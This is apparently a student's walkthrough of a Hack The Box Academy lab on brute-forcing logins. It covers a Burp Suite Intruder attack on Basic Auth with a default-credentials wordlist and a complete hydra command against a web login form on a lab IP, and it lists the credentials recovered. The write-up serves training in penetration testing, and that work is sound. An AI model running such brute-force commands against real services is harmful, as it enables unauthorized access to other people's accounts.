# Brute Force Skills Assessment Service Login  

[Skills Assessment Service Login](https://academy.hackthebox.com/module/57/section/516)  

>Target user: `Harry Potter`
>Target: `94.237.49.11:30154`  

>Website initial access is Basic Auth, and can Brute Force with Combined Wordlist.  

![skills assessment service login](/images/skills-assessment-service-login.png)  

>Using Burp Suite intruder with a wordlist that combine the username and password on single line as single payload.

![skills-assessment website burp intruder](/images/skills-assessment-website-burp-intruder.png)  

>Credentials discovered using the wordlist: `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`

```
echo 'dXNlcjpwYXNzd29yZA==' | base64 -d;echo        
user:password
```

>Login Form Brute Force - Static User, and a Password Wordlist.  

>The HTML form name and web parameters from the login can be seen on Burp Suite Repeater request and response windows:  

![skills-assessment-website-burp-repeater](/images/skills-assessment-website-burp-repeater.png)  

```
hydra -L ../resources/demo-users.lst -P ../resources/demo-pass.lst -f 94.237.57.58 -s 36713 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
```  

>Web application login Credentials discovered using brute force: `user:harrypotter`  
